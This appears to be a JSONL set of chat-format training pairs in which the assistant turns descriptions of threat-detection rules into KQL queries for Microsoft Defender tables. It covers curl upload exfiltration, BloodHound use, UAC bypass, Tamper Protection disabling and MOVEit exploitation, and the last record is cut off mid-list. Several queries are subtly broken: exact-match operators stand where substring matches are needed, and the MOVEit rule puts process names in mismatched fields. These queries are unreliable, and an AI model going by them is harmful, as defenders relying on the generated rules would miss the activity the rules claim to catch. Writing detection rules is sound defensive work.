{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Hides the file extension through modification of the registry Topic: registry_set_hidden_extention"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Advanced\\\\HideFileExt\" and RegistryValueData =~ \"DWORD (0x00000001)\") or (RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Advanced\\\\Hidden\" and RegistryValueData =~ \"DWORD (0x00000002)\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects python spawning a pretty tty Topic: proc_creation_win_python_pty_spawn"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFolderPath in~ (\"python.exe\", \"python3.exe\", \"python2.exe\")) and ((ProcessCommandLine in~ (\"import pty\", \".spawn(\")) or ProcessCommandLine =~ \"from pty import spawn\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a remote DLL load event via \"rundll32.exe\". Topic: image_load_rundll32_remote_share_load"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath startswith \"\\\\\\\\\" and InitiatingProcessFolderPath =~ \"\\\\rundll32.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of the \"curl\" process with \"upload\" flags. Which might indicate potential data exfiltration Topic: proc_creation_win_curl_fileupload"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (((ProcessCommandLine contains \" --form\" or ProcessCommandLine contains \" --upload-file \" or ProcessCommandLine contains \" --data \" or ProcessCommandLine contains \" --data-\") or ProcessCommandLine matches regex \"\\\\s-[FTd]\\\\s\") and (FolderPath endswith \"\\\\curl.exe\" or ProcessVersionInfoProductName =~ \"The curl executable\")) and (not((ProcessCommandLine in~ (\"://localhost\", \"://127.0.0.1\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect use of the Windows 8.3 short name. Which could be used as a method to avoid command-line detection Topic: proc_creation_win_susp_ntfs_short_name_path_use_cli"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"~1\\\\\", \"~2\\\\\")) and (not(((InitiatingProcessFolderPath in~ (\"C:\\\\Windows\\\\System32\\\\Dism.exe\", \"C:\\\\Windows\\\\System32\\\\cleanmgr.exe\", \"C:\\\\Program Files\\\\GPSoftware\\\\Directory Opus\\\\dopus.exe\")) or (InitiatingProcessFolderPath endswith \"\\\\WebEx\\\\WebexHost.exe\" or InitiatingProcessFolderPath endswith \"\\\\thor\\\\thor64.exe\" or InitiatingProcessFolderPath endswith \"\\\\veam.backup.shell.exe\" or InitiatingProcessFolderPath endswith \"\\\\winget.exe\" or InitiatingProcessFolderPath endswith \"\\\\Everything\\\\Everything.exe\") or InitiatingProcessFolderPath contains \"\\\\AppData\\\\Local\\\\Temp\\\\WinGet\\\\\" or (ProcessCommandLine contains \"\\\\appdata\\\\local\\\\webex\\\\webex64\\\\meetings\\\\wbxreport.exe\" or ProcessCommandLine contains \"C:\\\\Program Files\\\\Git\\\\post-install.bat\" or ProcessCommandLine contains \"C:\\\\Program Files\\\\Git\\\\cmd\\\\scalar.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects any registry event that targets the key SECURITY\\Policy\\Secrets\\n which is a key related to SNAKE malware as described by CISA Topic: registry_event_malware_snake_covert_store_key"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"SECURITY\\\\Policy\\\\Secrets\\\\n\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of the \"jamf\" binary to create user accounts and run commands. For example, the binary can be abused by attackers on the system in order to bypass security controls or remove application control polices.\n Topic: proc_creation_macos_jamf_usage"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"createAccount\", \"manage\", \"removeFramework\", \"removeMdmProfile\", \"resetPassword\", \"setComputerName\")) and InitiatingProcessFolderPath =~ \"/jamf\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of \"attrib\" with the \"+s\" flag to mark files as system files Topic: proc_creation_win_attrib_system"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \" +s \" and (FolderPath endswith \"\\\\attrib.exe\" or ProcessVersionInfoOriginalFileName =~ \"ATTRIB.EXE\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of \"csc.exe\" via \"w3wp.exe\" process. MOVEit affected hosts execute \"csc.exe\" via the \"w3wp.exe\" process to dynamically compile malicious DLL files.\n\nMOVEit is affected by a critical vulnerability. Exploited hosts show evidence of dynamically compiling a DLL and writing it under C:\\\\Windows\\\\Microsoft\\.NET\\\\Framework64\\\\v4\\.0\\.30319\\\\Temporary ASP\\.NET Files\\\\root\\\\([a-z0-9]{5,12})\\\\([a-z0-9]{5,12})\\\\App_Web_[a-z0-9]{5,12}\\.dll.\n\nHunting Opportunity\n\nEvents from IIS dynamically compiling binaries via the csc.exe on behalf of the MOVEit application, especially since May 27th should be investigated.\n Topic: proc_creation_win_exploit_cve_2023_34362_moveit_transfer_exploitation_activity"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessCommandLine =~ \"moveitdmz pool\" and InitiatingProcessFileName =~ \"\\\\w3wp.exe\" and InitiatingProcessFolderPath =~ \"\\\\csc.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of log files during a TeamViewer remote session Topic: file_event_win_susp_teamviewer_remote_session"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName in~ (\"\\\\TeamViewer\\\\RemotePrinting\\\\tvprint.db\", \"\\\\TeamViewer\\\\TVNetwork.log\")) or (FileName in~ (\"\\\\TeamViewer\", \"_Logfile.log\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects creation of new \".dll\" files inside the plugins directory of a notepad++ installation by a process other than \"gup.exe\". Which could indicates possible persistence Topic: file_event_win_notepad_plus_plus_persistence"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \".dll\" and (not((InitiatingProcessFolderPath =~ \"\\\\Notepad++\\\\updater\\\\gup.exe\" or (InitiatingProcessFolderPath has_all (\"C:\\\\Users\\\\\") and InitiatingProcessFolderPath contains \"\\\\AppData\\\\Local\\\\Temp\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential RDP connection via Mstsc using a local \".rdp\" file Topic: proc_creation_win_mstsc_run_local_rdp_file"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine endswith \".rdp\" or ProcessCommandLine endswith \".rdp\\\"\") and (FolderPath endswith \"\\\\mstsc.exe\" or ProcessVersionInfoOriginalFileName =~ \"mstsc.exe\")) and (not((InitiatingProcessFileName =~ \"C:\\\\Windows\\\\System32\\\\lxss\\\\wslhost.exe\" and ProcessCommandLine =~ \"C:\\\\ProgramData\\\\Microsoft\\\\WSL\\\\wslg.rdp\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects command line parameters used by Bloodhound and Sharphound hack tools Topic: proc_creation_win_hktl_bloodhound_sharphound"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" -CollectionMethod All \", \" --CollectionMethods Session \", \" --Loop --Loopduration \", \" --PortScanTimeout \", \".exe -c All -d \", \"Invoke-Bloodhound\", \"Get-BloodHoundData\")) or (ProcessCommandLine in~ (\" -JsonFolder \", \" -ZipFileName \")) or (ProcessCommandLine in~ (\" DCOnly \", \" --NoSaveCache \")) or (ProcessVersionInfoProductName contains \"SharpHound\" or ProcessVersionInfoFileDescription contains \"SharpHound\" or (ProcessVersionInfoCompanyName contains \"SpecterOps\" or ProcessVersionInfoCompanyName contains \"evil corp\") or (FolderPath contains \"\\\\Bloodhound.exe\" or FolderPath contains \"\\\\SharpHound.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of the \"ms-appinstaller\" protocol handler via command line to potentially download arbitrary files via AppInstaller.EXE\nThe downloaded files are temporarly stored in \":\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\\AC\\INetCache\\<RANDOM-8-CHAR-DIRECTORY>\"\n Topic: proc_creation_win_susp_ms_appinstaller_download"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"http\") or (ProcessCommandLine contains \"ms-appinstaller://\" and ProcessCommandLine contains \"source=\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the pattern of UAC Bypass using scheduled tasks and variable expansion of cleanmgr.exe (UACMe 34) Topic: proc_creation_win_uac_bypass_cleanmgr"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine endswith \"\\\"\\\\system32\\\\cleanmgr.exe /autoclean /d C:\" and (InitiatingProcessIntegrityLevel in~ (\"High\", \"System\", \"S-1-16-16384\", \"S-1-16-12288\")) and InitiatingProcessCommandLine =~ \"C:\\\\Windows\\\\system32\\\\svchost.exe -k netsvcs -p -s Schedule\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect the use of \"sc.exe\" to change the startup type of a service to \"disabled\" or \"demand\" Topic: proc_creation_win_sc_disable_service"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"disabled\", \"demand\")) and (FolderPath endswith \"\\\\sc.exe\" or ProcessVersionInfoOriginalFileName =~ \"sc.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects disabling Windows Defender Tamper Protection Topic: registry_set_disabled_tamper_protection_on_microsoft_defender"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryValueData =~ \"DWORD (0x00000000)\" and RegistryKey contains \"\\\\Microsoft\\\\Windows Defender\\\\Features\\\\TamperProtection\") and (not((InitiatingProcessFolderPath in~ (\"\\\\MsMpEng.exe\", \"C:\\\\Program Files\\\\Windows Defender\\\\MsMpEng.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects any GAC DLL being loaded by an Office Product Topic: image_load_office_dotnet_gac_dll_load"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath startswith \"C:\\\\Windows\\\\Microsoft.NET\\\\assembly\\\\GAC_MSIL\" and (InitiatingProcessFolderPath in~ (\"\\\\excel.exe\", \"\\\\mspub.exe\", \"\\\\onenote.exe\", \"\\\\onenoteim.exe\", \"\\\\outlook.exe\", \"\\\\powerpnt.exe\", \"\\\\winword.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the usage of emojis in the command line, this could be a sign of potential defense evasion activity. Topic: proc_creation_win_susp_emoji_usage_in_cli_2"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"\ud83e\udd37\ud83c\udffc\", \"\ud83e\udd37\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83d\ude4e\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83d\ude4e\ud83c\udffc\", \"\ud83d\ude4e\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83d\ude4d\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83d\ude4d\ud83c\udffc\", \"\ud83d\ude4d\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83d\udc87\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83d\udc87\ud83c\udffc\", \"\ud83d\udc87\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83d\udc86\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83d\udc86\ud83c\udffc\", \"\ud83d\udc86\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83e\uddd6\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83e\uddd6\ud83c\udffc\", \"\ud83e\uddd6\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83d\udc83\ud83c\udffc\", \"\ud83d\udd7a\ud83c\udffc\", \"\ud83d\udd74\ud83c\udffc\", \"\ud83d\udc69\ud83c\udffc\u200d\ud83e\uddbd\", \"\ud83e\uddd1\ud83c\udffc\u200d\ud83e\uddbd\", \"\ud83d\udc68\ud83c\udffc\u200d\ud83e\uddbd\", \"\ud83d\udc69\ud83c\udffc\u200d\ud83e\uddbc\", \"\ud83e\uddd1\ud83c\udffc\u200d\ud83e\uddbc\", \"\ud83d\udc68\ud83c\udffc\u200d\ud83e\uddbc\", \"\ud83d\udeb6\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83d\udeb6\ud83c\udffc\", \"\ud83d\udeb6\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83d\udc69\ud83c\udffc\u200d\ud83e\uddaf\", \"\ud83e\uddd1\ud83c\udffc\u200d\ud83e\uddaf\", \"\ud83d\udc68\ud83c\udffc\u200d\ud83e\uddaf\", \"\ud83e\uddce\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83e\uddce\ud83c\udffc\", \"\ud83e\uddce\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83c\udfc3\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83c\udfc3\ud83c\udffc\", \"\ud83c\udfc3\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83e\uddcd\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83e\uddcd\ud83c\udffc\", \"\ud83e\uddcd\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83d\udc6d\ud83c\udffc\", \"\ud83e\uddd1\ud83c\udffc\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c\udffc\", \"\ud83d\udc6c\ud83c\udffc\", \"\ud83d\udc6b\ud83c\udffc\", \"\ud83e\uddd7\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83e\uddd7\ud83c\udffc\", \"\ud83e\uddd7\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83c\udfc7\ud83c\udffc\", \"\ud83c\udfc2\ud83c\udffc\", \"\ud83c\udfcc\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83c\udfcc\ud83c\udffc\", \"\ud83c\udfcc\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83c\udfc4\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83c\udfc4\ud83c\udffc\", \"\ud83c\udfc4\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83d\udea3\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83d\udea3\ud83c\udffc\", \"\ud83d\udea3\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83c\udfca\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83c\udfca\ud83c\udffc\", \"\ud83c\udfca\ud83c\udffc\u200d\u2642\ufe0f\", \"\u26f9\ud83c\udffc\u200d\u2640\ufe0f\", \"\u26f9\ud83c\udffc\", \"\u26f9\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83c\udfcb\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83c\udfcb\ud83c\udffc\", \"\ud83c\udfcb\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83d\udeb4\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83d\udeb4\ud83c\udffc\", \"\ud83d\udeb4\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83d\udeb5\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83d\udeb5\ud83c\udffc\", \"\ud83d\udeb5\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83e\udd38\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83e\udd38\ud83c\udffc\", \"\ud83e\udd38\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83e\udd3d\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83e\udd3d\ud83c\udffc\", \"\ud83e\udd3d\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83e\udd3e\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83e\udd3e\ud83c\udffc\", \"\ud83e\udd3e\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83e\udd39\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83e\udd39\ud83c\udffc\", \"\ud83e\udd39\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83e\uddd8\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83e\uddd8\ud83c\udffc\", \"\ud83e\uddd8\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83d\udec0\ud83c\udffc\", \"\ud83d\udecc\ud83c\udffc\", \"\ud83d\udc4b\ud83c\udffd\", \"\ud83e\udd1a\ud83c\udffd\", \"\ud83d\udd90\ud83c\udffd\", \"\u270b\ud83c\udffd\", \"\ud83d\udd96\ud83c\udffd\", \"\ud83d\udc4c\ud83c\udffd\", \"\ud83e\udd0c\ud83c\udffd\", \"\ud83e\udd0f\ud83c\udffd\", \"\u270c\ud83c\udffd\", \"\ud83e\udd1e\ud83c\udffd\", \"\ud83e\udef0\ud83c\udffd\", \"\ud83e\udd1f\ud83c\udffd\", \"\ud83e\udd18\ud83c\udffd\", \"\ud83e\udd19\ud83c\udffd\", \"\ud83e\udef5\ud83c\udffd\", \"\ud83e\udef1\ud83c\udffd\", \"\ud83e\udef2\ud83c\udffd\", \"\ud83e\udef3\ud83c\udffd\", \"\ud83e\udef4\ud83c\udffd\", \"\ud83d\udc48\ud83c\udffd\", \"\ud83d\udc49\ud83c\udffd\", \"\ud83d\udc46\ud83c\udffd\", \"\ud83d\udd95\ud83c\udffd\", \"\ud83d\udc47\ud83c\udffd\", \"\u261d\ud83c\udffd\", \"\ud83d\udc4d\ud83c\udffd\", \"\ud83d\udc4e\ud83c\udffd\", \"\u270a\ud83c\udffd\", \"\ud83d\udc4a\ud83c\udffd\", \"\ud83e\udd1b\ud83c\udffd\", \"\ud83e\udd1c\ud83c\udffd\", \"\ud83d\udc4f\ud83c\udffd\", \"\ud83e\udef6\ud83c\udffd\", \"\ud83d\ude4c\ud83c\udffd\", \"\ud83d\udc50\ud83c\udffd\", \"\ud83e\udd32\ud83c\udffd\", \"\ud83d\ude4f\ud83c\udffd\", \"\u270d\ud83c\udffd\", \"\ud83d\udcaa\ud83c\udffd\", \"\ud83e\uddb5\ud83c\udffd\", \"\ud83e\uddb6\ud83c\udffd\", \"\ud83d\udc42\ud83c\udffd\", \"\ud83e\uddbb\ud83c\udffd\", \"\ud83d\udc43\ud83c\udffd\", \"\ud83d\udc76\ud83c\udffd\", \"\ud83d\udc67\ud83c\udffd\", \"\ud83e\uddd2\ud83c\udffd\", \"\ud83d\udc66\ud83c\udffd\", \"\ud83d\udc69\ud83c\udffd\", \"\ud83e\uddd1\ud83c\udffd\", \"\ud83d\udc68\ud83c\udffd\", \"\ud83d\udc69\ud83c\udffd\u200d\ud83e\uddb1\", \"\ud83e\uddd1\ud83c\udffd\u200d\ud83e\uddb1\", \"\ud83d\udc68\ud83c\udffd\u200d\ud83e\uddb1\", \"\ud83d\udc69\ud83c\udffd\u200d\ud83e\uddb0\", \"\ud83e\uddd1\ud83c\udffd\u200d\ud83e\uddb0\", \"\ud83d\udc68\ud83c\udffd\u200d\ud83e\uddb0\", \"\ud83d\udc71\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83d\udc71\ud83c\udffd\", \"\ud83d\udc71\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83d\udc69\ud83c\udffd\u200d\ud83e\uddb3\", \"\ud83e\uddd1\ud83c\udffd\u200d\ud83e\uddb3\", \"\ud83d\udc68\ud83c\udffd\u200d\ud83e\uddb3\", \"\ud83d\udc69\ud83c\udffd\u200d\ud83e\uddb2\", \"\ud83e\uddd1\ud83c\udffd\u200d\ud83e\uddb2\", \"\ud83d\udc68\ud83c\udffd\u200d\ud83e\uddb2\", \"\ud83e\uddd4\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83e\uddd4\ud83c\udffd\", \"\ud83e\uddd4\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83d\udc75\ud83c\udffd\", \"\ud83e\uddd3\ud83c\udffd\", \"\ud83d\udc74\ud83c\udffd\", \"\ud83d\udc72\ud83c\udffd\", \"\ud83d\udc73\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83d\udc73\ud83c\udffd\", \"\ud83d\udc73\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83e\uddd5\ud83c\udffd\", \"\ud83d\udc6e\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83d\udc6e\ud83c\udffd\", \"\ud83d\udc6e\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83d\udc77\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83d\udc77\ud83c\udffd\", \"\ud83d\udc77\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83d\udc82\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83d\udc82\ud83c\udffd\", \"\ud83d\udc82\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83d\udd75\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83d\udd75\ud83c\udffd\", \"\ud83d\udd75\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83d\udc69\ud83c\udffd\u200d\u2695\ufe0f\", \"\ud83e\uddd1\ud83c\udffd\u200d\u2695\ufe0f\", \"\ud83d\udc68\ud83c\udffd\u200d\u2695\ufe0f\", \"\ud83d\udc69\ud83c\udffd\u200d\ud83c\udf3e\", \"\ud83e\uddd1\ud83c\udffd\u200d\ud83c\udf3e\", \"\ud83d\udc68\ud83c\udffd\u200d\ud83c\udf3e\", \"\ud83d\udc69\ud83c\udffd\u200d\ud83c\udf73\", \"\ud83e\uddd1\ud83c\udffd\u200d\ud83c\udf73\", \"\ud83d\udc68\ud83c\udffd\u200d\ud83c\udf73\", \"\ud83d\udc69\ud83c\udffd\u200d\ud83c\udf93\", \"\ud83e\uddd1\ud83c\udffd\u200d\ud83c\udf93\", \"\ud83d\udc68\ud83c\udffd\u200d\ud83c\udf93\", \"\ud83d\udc69\ud83c\udffd\u200d\ud83c\udfa4\", \"\ud83e\uddd1\ud83c\udffd\u200d\ud83c\udfa4\", \"\ud83d\udc68\ud83c\udffd\u200d\ud83c\udfa4\", \"\ud83d\udc69\ud83c\udffd\u200d\ud83c\udfeb\", \"\ud83e\uddd1\ud83c\udffd\u200d\ud83c\udfeb\", \"\ud83d\udc68\ud83c\udffd\u200d\ud83c\udfeb\", \"\ud83d\udc69\ud83c\udffd\u200d\ud83c\udfed\", \"\ud83e\uddd1\ud83c\udffd\u200d\ud83c\udfed\", \"\ud83d\udc68\ud83c\udffd\u200d\ud83c\udfed\", \"\ud83d\udc69\ud83c\udffd\u200d\ud83d\udcbb\", \"\ud83e\uddd1\ud83c\udffd\u200d\ud83d\udcbb\", \"\ud83d\udc68\ud83c\udffd\u200d\ud83d\udcbb\", \"\ud83d\udc69\ud83c\udffd\u200d\ud83d\udcbc\", \"\ud83e\uddd1\ud83c\udffd\u200d\ud83d\udcbc\", \"\ud83d\udc68\ud83c\udffd\u200d\ud83d\udcbc\", \"\ud83d\udc69\ud83c\udffd\u200d\ud83d\udd27\", \"\ud83e\uddd1\ud83c\udffd\u200d\ud83d\udd27\", \"\ud83d\udc68\ud83c\udffd\u200d\ud83d\udd27\", \"\ud83d\udc69\ud83c\udffd\u200d\ud83d\udd2c\", \"\ud83e\uddd1\ud83c\udffd\u200d\ud83d\udd2c\", \"\ud83d\udc68\ud83c\udffd\u200d\ud83d\udd2c\", \"\ud83d\udc69\ud83c\udffd\u200d\ud83c\udfa8\", \"\ud83e\uddd1\ud83c\udffd\u200d\ud83c\udfa8\", \"\ud83d\udc68\ud83c\udffd\u200d\ud83c\udfa8\", \"\ud83d\udc69\ud83c\udffd\u200d\ud83d\ude92\", \"\ud83e\uddd1\ud83c\udffd\u200d\ud83d\ude92\", \"\ud83d\udc68\ud83c\udffd\u200d\ud83d\ude92\", \"\ud83d\udc69\ud83c\udffd\u200d\u2708\ufe0f\", \"\ud83e\uddd1\ud83c\udffd\u200d\u2708\ufe0f\", \"\ud83d\udc68\ud83c\udffd\u200d\u2708\ufe0f\", \"\ud83d\udc69\ud83c\udffd\u200d\ud83d\ude80\", \"\ud83e\uddd1\ud83c\udffd\u200d\ud83d\ude80\", \"\ud83d\udc68\ud83c\udffd\u200d\ud83d\ude80\", \"\ud83d\udc69\ud83c\udffd\u200d\u2696\ufe0f\", \"\ud83e\uddd1\ud83c\udffd\u200d\u2696\ufe0f\", \"\ud83d\udc68\ud83c\udffd\u200d\u2696\ufe0f\", \"\ud83d\udc70\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83d\udc70\ud83c\udffd\", \"\ud83d\udc70\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83e\udd35\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83e\udd35\ud83c\udffd\", \"\ud83e\udd35\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83d\udc78\ud83c\udffd\", \"\ud83e\udec5\ud83c\udffd\", \"\ud83e\udd34\ud83c\udffd\", \"\ud83e\udd77\ud83c\udffd\", \"\ud83e\uddb8\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83e\uddb8\ud83c\udffd\", \"\ud83e\uddb8\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83e\uddb9\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83e\uddb9\ud83c\udffd\", \"\ud83e\uddb9\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83e\udd36\ud83c\udffd\", \"\ud83e\uddd1\ud83c\udffd\u200d\ud83c\udf84\", \"\ud83c\udf85\ud83c\udffd\", \"\ud83e\uddd9\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83e\uddd9\ud83c\udffd\", \"\ud83e\uddd9\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83e\udddd\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83e\udddd\ud83c\udffd\", \"\ud83e\udddd\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83e\udddb\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83e\udddb\ud83c\udffd\", \"\ud83e\udddb\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83e\udddc\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83e\udddc\ud83c\udffd\", \"\ud83e\udddc\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83e\uddda\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83e\uddda\ud83c\udffd\", \"\ud83e\uddda\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83d\udc7c\ud83c\udffd\", \"\ud83e\udd30\ud83c\udffd\", \"\ud83e\udec4\ud83c\udffd\", \"\ud83e\udec3\ud83c\udffd\", \"\ud83e\udd31\ud83c\udffd\", \"\ud83d\udc69\ud83c\udffd\u200d\ud83c\udf7c\", \"\ud83e\uddd1\ud83c\udffd\u200d\ud83c\udf7c\", \"\ud83d\udc68\ud83c\udffd\u200d\ud83c\udf7c\", \"\ud83d\ude47\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83d\ude47\ud83c\udffd\", \"\ud83d\ude47\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83d\udc81\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83d\udc81\ud83c\udffd\", \"\ud83d\udc81\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83d\ude45\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83d\ude45\ud83c\udffd\", \"\ud83d\ude45\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83d\ude46\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83d\ude46\ud83c\udffd\", \"\ud83d\ude46\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83d\ude4b\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83d\ude4b\ud83c\udffd\", \"\ud83d\ude4b\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83e\uddcf\ud83c\udffd\u200d\u2640\ufe0f\", 